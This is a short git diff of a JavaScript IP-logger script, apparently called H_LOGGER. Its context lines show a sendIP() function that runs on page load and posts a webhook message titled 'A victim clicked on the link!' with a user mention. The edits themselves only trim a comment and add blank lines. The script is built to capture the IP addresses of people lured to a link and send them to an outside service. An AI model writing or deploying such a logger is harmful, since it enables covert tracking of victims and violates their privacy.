@@ -15,7 +15,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "H_LOGGER", // optionally changeable
                             avatar_url: "https://www.mediafire.com/view/03dfv959nfnvdjm/fpxpmk.jpg", // optionally changeable
-                            content: `@hyper_r7100`, // optionally you can change like @everyone @here or mention someone @<id>
+                            content: `@hyper_r7100`, // optionally you can change 
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
@@ -40,6 +40,7 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
 
 
